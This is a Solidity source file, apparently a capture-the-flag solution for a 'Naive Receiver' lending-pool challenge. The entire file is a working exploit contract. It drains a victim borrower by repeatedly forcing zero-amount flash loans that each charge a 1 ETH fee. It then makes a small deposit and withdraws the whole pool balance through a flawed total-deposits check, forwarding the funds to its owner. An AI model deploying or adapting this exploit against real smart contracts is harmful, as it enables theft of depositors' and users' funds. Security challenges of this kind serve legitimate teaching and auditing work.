// SPDX-License-Identifier: MIT
// NAIVE-RECEIVER DRAIN (forced-borrow griefing + TVL/credit confusion).
// Phase 1: force the victim borrower into fee-charged flash loans until its
// ETH is gone. Phase 2: seed a 0.1 ETH deposit, then withdraw the ENTIRE pool
// balance — the pool checks its total deposits instead of our credit.
pragma solidity ^0.8.0;

import {NaiveReceiverPool} from "../challenges/NaiveReceiverPool.sol";

contract NaiveReceiverAttacker {
    NaiveReceiverPool public immutable pool;
    address public immutable victim;
    address public immutable owner;

    uint256 internal constant SEED = 0.1 ether;

    constructor(address _pool, address _victim) {
        pool = NaiveReceiverPool(payable(_pool));
        victim = _victim;
        owner = msg.sender;
    }

    function attack(uint256 feeGriefCount) external {
        // Phase 1: each forced flash loan charges the victim the 1 ETH fee.
        for (uint256 i = 0; i < feeGriefCount; i++) {
            pool.flashLoan(victim, 0);
        }

        // Phase 2: seed credit, then withdraw against the POOL's TVL check.
        pool.deposit{value: SEED}();
        pool.withdraw(address(pool).balance, payable(address(this)));

        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
